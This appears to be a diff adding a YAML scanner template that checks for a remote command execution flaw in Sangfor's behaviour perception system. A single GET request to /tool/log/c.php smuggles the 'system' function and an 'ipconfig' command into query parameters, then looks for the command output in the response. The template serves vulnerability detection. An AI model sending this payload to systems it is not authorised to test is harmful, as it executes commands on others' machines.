@@ -1,0 +1,17 @@
+name: sangfor_Behavior_perception_system_c.php_RCE
+transport: http
+set: {}
+detail:
+  dock: 'body="isHighPerformance : !!SFIsHighPerformance,"'
+  product: 深信服 行为感知系统
+  homepage: ''
+  impact: ''
+  description: 深信服 行为感知系统 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行
+rules:
+  r1:
+    method: GET
+    path: /tool/log/c.php?strip_slashes=system&host=ipconfig
+    follow_redirects: true
+    headers: {}
+    expression: response.status == 200 || response.body.bcontains(b'Windows IP') || response.body.bcontains(b'IPv6')
+expression: r1()
